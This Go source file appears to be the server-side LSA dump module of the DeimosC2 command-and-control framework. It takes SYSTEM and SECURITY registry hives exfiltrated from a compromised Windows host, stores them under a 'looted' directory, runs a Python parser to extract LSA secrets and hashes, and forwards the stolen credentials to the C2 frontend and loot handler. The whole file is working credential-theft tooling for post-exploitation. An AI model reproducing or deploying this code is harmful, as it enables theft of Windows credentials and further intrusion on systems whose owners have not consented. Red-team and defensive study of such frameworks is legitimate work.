package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/rpc"
	"net/rpc/jsonrpc"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"strconv"
	"strings"
	"sync"

	"github.com/AdvancedThreatAnalytics/DeimosC2/lib/logging"
	"github.com/AdvancedThreatAnalytics/DeimosC2/lib/modulescommon"
)

//ModData is used for RPC
type ModData int

var wg sync.WaitGroup

var rpcPort = 63002
var client *rpc.Client

//global counter
var lsaCount = 0

type downloadFiles struct {
	Systemfile string
	Systemdata string
	Secfile    string
	Secdata    string
}

//AllLSACreds is a global variable that holds all the LSA creds
var AllLSACreds = map[int]*Lsa{}

//Lsa struct for storing data
type Lsa struct {
	LSAName string
	LSAHash string
}

//Module is the datastructure of modules
type Module struct {
	Name string //Holds the name of the module
	Port int    //Holds the RPC port of the module server
}

func startModuleServer() {
	modRPC := new(ModData)
	rpc.Register(modRPC)
	rpc.HandleHTTP()
	var l net.Listener
	var e error
	for {
		s := strconv.Itoa(rpcPort)
		l, e = net.Listen("tcp", "127.0.0.1:"+s)
		if e == nil {
			break
		}
		rpcPort++
	}
	wg.Add(1)
	//go http.Serve(l, nil)
	for {
		conn, err := l.Accept()
		if err != nil {
			log.Fatal(err)
		}

		go rpc.ServeCodec(jsonrpc.NewServerCodec(conn))
	}

}

//RecData will take in data to be acted on from the server
func (t *ModData) RecData(data modulescommon.ModuleCom, reply *string) error {
	r := server(data)
	*reply = r
	return nil
}

//EndServer will be called in order to end the module
func (t *ModData) EndServer(end bool, reply *bool) error {
	if end == true {
		defer wg.Done()
	}
	return nil
}

func server(data modulescommon.ModuleCom) string {

	cwd, _ := os.Getwd()

	//Assign dmpFile content to the content of the struct downloadOutput
	var dmpFile downloadFiles
	json.Unmarshal(data.Data, &dmpFile)

	//SYSTEM HIVE FILE
	systemdmpData, _ := base64.StdEncoding.DecodeString(dmpFile.Systemdata)
	systemPath := path.Join(cwd, "resources", "looted", data.AgentKey, "files", dmpFile.Systemfile)
	systemName := fmt.Sprintf(systemPath)
	systemfile, _ := os.Create(systemName)
	systemfile.Write(systemdmpData)

	//SECURITY HIVE FILE
	securitydmpData, _ := base64.StdEncoding.DecodeString(dmpFile.Secdata)
	securityPath := path.Join(cwd, "resources", "looted", data.AgentKey, "files", dmpFile.Secfile)
	securityName := fmt.Sprintf(securityPath)
	securityFile, _ := os.Create(securityName)
	securityFile.Write(securitydmpData)

	var reply []byte
	//parsing hive files for the LSA secrets, saving to a file in json output, and sending to the FE
	lsaParser(systemPath, securityPath)
	parsedLSAPath := path.Join(cwd, "resources", "looted", data.AgentKey, "files", "LSA_output.json")
	parsedLSAName := fmt.Sprintf(parsedLSAPath)
	parsedLSAFile, _ := json.MarshalIndent(AllLSACreds, "", "")
	_ = ioutil.WriteFile(parsedLSAName, parsedLSAFile, 0777)

	parsedLSAMsg := modulescommon.ModOutput{
		AgentKey:   data.AgentKey,
		ModuleName: data.ModuleName,
		OutputType: "Link",
		Output:     []byte(filepath.Base(parsedLSAPath)),
	}

	client.Call("ModData.ModSendData", &parsedLSAMsg, &reply)

	//Sending the LSA JSON data to Loot handler
	LootLSAMsg := modulescommon.ModOutput{
		AgentKey:   data.AgentKey,
		ModuleName: data.ModuleName,
		OutputType: "Loot",
		Output:     []byte("{\"Type\":\"LSA\", \"Data\":\"" + string(parsedLSAFile) + "\"}"),
	}

	client.Call("ModData.ModSendData", &LootLSAMsg, &reply)

	return ""
}

//parser for extracts LSASecrets
func lsaParser(system string, security string) {
	cwd, _ := os.Getwd()
	pythonPath := path.Join(cwd, "modules", "credentialaccess", "samdump", "server", "bin", "lsaparse.py")
	cmd := exec.Command("python", pythonPath, system, security)
	lsaOut, _ := cmd.CombinedOutput()

	for _, line := range strings.Split(strings.TrimSuffix(string(lsaOut), "\n"), "\n") {
		var lsaCreds Lsa
		json.Unmarshal([]byte(line), &lsaCreds)
		AllLSACreds[lsaCount] = &lsaCreds
		lsaCount++
	}
}

//The correct RPC port needs to be specified in order for the module to work
//this is passed as a commandline command on module startup
func main() {
	port := os.Args[1]
	//Starts up the local RPC server to recieve data
	go startModuleServer()
	logging.Logger.Println("connecting")
	//Makes the connection to the main server
	conn, err := net.Dial("tcp", "127.0.0.1:"+port)
	if err != nil {
		log.Fatal("dialing:", err)
	}

	defer conn.Close()

	client = jsonrpc.NewClient(conn)

	m := Module{"lsadump", rpcPort}

	logging.Logger.Println("Checking in..")
	var reply []byte
	//Registers with the main server
	err = client.Call("ModData.ModInit", m, &reply)
	if err != nil {
		log.Fatal("RPC error:", err)
	}

	//Waits till the module is finished
	wg.Wait()
}
